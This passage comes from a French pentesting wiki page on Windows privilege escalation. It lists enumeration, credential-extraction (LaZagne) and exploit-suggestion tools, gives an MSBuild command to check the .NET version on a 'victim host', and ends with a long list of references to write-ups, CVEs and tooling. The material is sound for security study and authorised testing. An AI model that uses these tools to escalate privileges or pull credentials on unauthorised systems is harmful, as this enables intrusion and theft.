[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Énumération Windows de base pour privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Recherche des vulnérabilités de privesc connues (DÉPRÉCIÉ pour Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Vérifications locales **(besoin des droits Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Recherche des vulnérabilités de privesc connues (doit être compilé avec VisualStudio) ([**précompilé**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Énumère l'hôte à la recherche de mauvaises configurations (plutôt un outil de collecte d'infos qu'un outil de privesc) (doit être compilé) **(**[**précompilé**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrait des identifiants depuis de nombreux logiciels (exe précompilé sur github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Portage de PowerUp en C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Vérifie les mauvaises configurations (exécutable précompilé sur github). Déconseillé. Cela ne fonctionne pas bien sous Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Vérifie les mauvaises configurations possibles (exe à partir de python). Déconseillé. Cela ne fonctionne pas bien sous Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Outil créé à partir de ce post (il n'a pas besoin d'accesschk pour fonctionner correctement mais il peut l'utiliser).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lit la sortie de **systeminfo** et recommande des exploits fonctionnels (python local)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lit la sortie de **systeminfo** et recommande des exploits fonctionnels (python local)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Tu dois compiler le projet en utilisant la bonne version de .NET ([voir ceci](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Pour voir la version de .NET installée sur l'hôte victime, tu peux faire :
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Références

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: phishing de macro Word VBA via SMTP → déchiffrement des identifiants hMailServer → Veeam CVE-2023-27532 vers SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: leak de format-string + stack BOF → VirtualAlloc ROP (RCE) et vol du token kernel](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Vulnerabilité de système de fichiers privilégié présente dans un système SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – utilisation de CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (portage BOF Cobalt Strike)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)

{{#include ../../banners/hacktricks-training.md}}
